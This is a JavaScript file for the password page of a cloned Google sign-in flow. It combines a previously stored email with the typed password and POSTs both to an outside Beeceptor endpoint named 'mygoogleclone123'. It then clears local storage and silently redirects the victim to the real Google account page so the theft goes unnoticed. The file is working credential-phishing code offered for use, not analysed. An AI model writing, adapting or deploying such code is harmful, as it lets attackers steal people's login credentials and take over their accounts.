// 1. Fetch the email from the first page's localStorage memory
const finalEmail = localStorage.getItem('savedUserEmail') || "unknown@email.com";
document.getElementById('use-account').innerText = finalEmail;

// 2. PASTE YOUR UNIQUE BEECEPTOR ENDPOINT URL HERE
const BEECEPTOR_URL = "https://mygoogleclone123.free.beeceptor.com"; 

// 3. Listen for the Next/Submit button click
document.getElementById('submit-btn').addEventListener('click', function(event) {
    event.preventDefault(); // Prevents the page from reloading automatically

    const passwordValue = document.getElementById('password').value.trim();

    // Validation check
    if (passwordValue === "") {
        alert("Please enter your password.");
        return;
    }

    // 4. Send the Data straight to your Beeceptor Cloud Endpoint over the Internet
    fetch(BEECEPTOR_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            email: finalEmail,       // Sends the email we saved from Google.html
            password: passwordValue, // Sends the password typed on this page
            device: "Mobile Test Tool",
            timestamp: new Date().toLocaleString()
        })
    })
    .then(response => {
        if (response.ok) {
            // SUCCESS ALERT REMOVED HERE FOR A SMOOTH, SILENT REDIRECT
            
            // Clear out the browser's temporary storage
            localStorage.clear(); 
            
            // Redirect them instantly to the real Google Account dashboard
            window.location.href = "https://myaccount.google.com"; 
        } else {
            alert("Server responded with an error code.");
        }
    })
    .catch(error => {
        console.error("Network Error:", error);
        alert("Could not connect to the cloud. Check your internet connection.");
    });
});